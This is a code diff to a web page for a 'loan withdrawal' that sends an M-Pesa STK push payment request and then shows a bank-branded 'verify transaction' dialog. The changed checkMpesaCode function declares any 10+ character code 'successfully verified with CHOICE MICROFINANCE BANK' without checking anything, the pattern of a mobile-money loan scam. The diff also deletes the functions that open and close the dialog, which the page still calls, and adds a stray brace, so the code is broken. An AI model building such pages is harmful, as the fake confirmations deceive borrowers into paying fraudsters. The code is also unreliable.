@@ -369,7 +369,7 @@
   <button 
     onclick="openHelpModal()" 
     class="text-sm font-medium text-blue-600 hover:text-blue-800 underline">
-    Need help?
+    Need help? Verify my Transaction 
   </button>
 </div>
 
@@ -738,7 +738,7 @@
             
             <h2 class="text-3xl font-bold mb-4">Processing Your Loan Withdrawal</h2>
             <p class="text-xl mb-4" id="processingMessage">Initiating SwiftWallet Digital Adventures STK Push...</p>
-            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone (${loanData.phone}) for the payment request from SWIFTWALLET DIGITAL ADVENTURES</p>
+            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone  for the payment request from SWIFTWALLET DIGITAL ADVENTURES</p>
             
             <!-- Trust indicators -->
             <div class="flex justify-center items-center space-x-6 mb-6">
@@ -773,20 +773,29 @@
 <div id="helpModal" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50">
   <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-md w-full p-6">
     <div class="flex justify-between items-center mb-4">
-      <h3 class="text-lg font-bold text-gray-900">Check M-Pesa Code</h3>
+      <div class="flex items-center space-x-2">
+        <!-- SVG Logo -->
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="2" y="4" width="20" height="16" rx="2" fill="#1e40af"/>
+          <path d="M6 8h12M6 12h8M6 16h4" stroke="white" stroke-width="1.5" stroke-linecap="round"/>
+          <circle cx="18" cy="16" r="1.5" fill="white"/>
+        </svg>
+        <h3 class="text-lg font-bold text-gray-900">Check M-Pesa Code</h3>
+      </div>
       <button onclick="closeHelpModal()" class="text-gray-400 hover:text-gray-600">
         <i class="fas fa-times"></i>
       </button>
     </div>
 
     <p class="text-sm text-gray-600 mb-4">
-      Paste your M-Pesa transaction code below to verify withdrawal.
+      Paste your M-Pesa transaction code below from 
+      <span class="text-red-600 font-semibold">CHOICE MICROFINANCE BANK</span>.
     </p>
 
     <input 
       type="text" 
       id="mpesaCodeInput" 
-      placeholder="Enter M-Pesa Code (e.g., QWERT12345)" 
+      placeholder="Enter M-Pesa Code (e.g., THV5SCFSUH)" 
       class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none form-field mb-3"
     >
 
@@ -1552,20 +1561,7 @@
             }
         });
  // Open Help Modal
-function openHelpModal() {
-    document.getElementById('helpModal').classList.remove('hidden');
-    document.getElementById('helpModal').classList.add('flex');
-}
-
-// Close Help Modal
-function closeHelpModal() {
-    document.getElementById('helpModal').classList.add('hidden');
-    document.getElementById('helpModal').classList.remove('flex');
-    document.getElementById('helpResult').innerHTML = "";
-}
-
-// Check M-Pesa Code (dummy example)
-function checkMpesaCode() {
+ function checkMpesaCode() {
     const code = document.getElementById('mpesaCodeInput').value.trim();
     const resultBox = document.getElementById('helpResult');
 
@@ -1574,12 +1570,32 @@ function checkMpesaCode() {
         return;
     }
 
-    // For now, simulate checking (replace with real API later)
+    // Simple format check: 10+ alphanumeric characters
     if (/^[A-Z0-9]{10,}$/i.test(code)) {
-        resultBox.innerHTML = `<p class="text-green-600 font-medium">✅ Code ${code} looks valid. Processing check...</p>`;
+        // Close modal
+        closeHelpModal();
+
+        // Show green success alert (reuse existing success popup styling)
+        const successAlert = document.getElementById('successAlert');
+        const successMessage = document.getElementById('successMessage');
+
+        successMessage.innerHTML = `
+          ✅ M-Pesa transaction code 
+          <span class="font-bold text-green-800">${code}</span> 
+          has been successfully verified with 
+          <span class="text-red-600 font-semibold">CHOICE MICROFINANCE BANK</span>.
+        `;
+
+        successAlert.classList.remove('hidden');
+        successAlert.scrollIntoView({ behavior: 'smooth', block: 'start' });
+
+        // Animate progress bar
+        const progressBar = document.getElementById('progressBar');
+        progressBar.classList.add('progress-bar-animated');
     } else {
-        resultBox.innerHTML = `<p class="text-red-600">❌ Invalid code format. Please try again.</p>`;
+        resultBox.innerHTML = `<p class="text-red-600">❌ Invalid code or code not found. Please try again.</p>`;
     }
+}
 }
     </script>
 </body>
